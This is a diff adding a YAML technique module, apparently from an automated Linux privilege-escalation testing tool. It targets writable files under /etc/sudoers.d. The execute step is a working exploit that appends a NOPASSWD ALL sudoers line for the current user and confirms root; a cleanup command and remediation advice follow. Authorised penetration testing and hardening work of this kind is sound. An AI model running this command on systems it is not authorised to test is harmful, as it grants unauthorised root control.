@@ -1,0 +1,39 @@
+# Writable /etc/sudoers.d/* → self-grant NOPASSWD ALL
+technique: T1548.001
+name: writable /etc/sudoers.d → self-grant root
+key: privesc:writable-sudoers-d
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: config-change
+  detection: moderate
+detect:
+  facts_match: {has_writable_sudoers_d: true}
+execute:
+  command: |-
+    me=$(id -un)
+    tgt=$(find /etc/sudoers.d -maxdepth 1 -type f -writable 2>/dev/null | head -1)
+    [ -n "$tgt" ] || exit 1
+    echo "$me ALL=(ALL) NOPASSWD: ALL" >> "$tgt"
+    sudo -n id
+verify:
+  success: "uid=0"
+cleanup:
+  command: |-
+    me=$(id -un)
+    tgt=$(find /etc/sudoers.d -maxdepth 1 -type f -writable 2>/dev/null | head -1)
+    [ -n "$tgt" ] && sed -i "/^$me ALL=(ALL) NOPASSWD: ALL$/d" "$tgt"
+report:
+  vector_type: writable_sudoers_d
+  evidence: "writable /etc/sudoers.d/* file"
+  description: >
+    Any file under ``/etc/sudoers.d/`` is included by ``/etc/sudoers``
+    at sudo-init time. Append your own ``NOPASSWD: ALL`` line and the
+    next sudo invocation runs as root. Subtler than editing /etc/sudoers
+    directly because sudoers.d entries are expected to be modular.
+  remediation: >
+    All files under ``/etc/sudoers.d/`` must be root-owned, 0440.
+    Validate with ``visudo -c``. Audit any config-management tooling
+    that drops files here.
+  refs: [T1548.001]
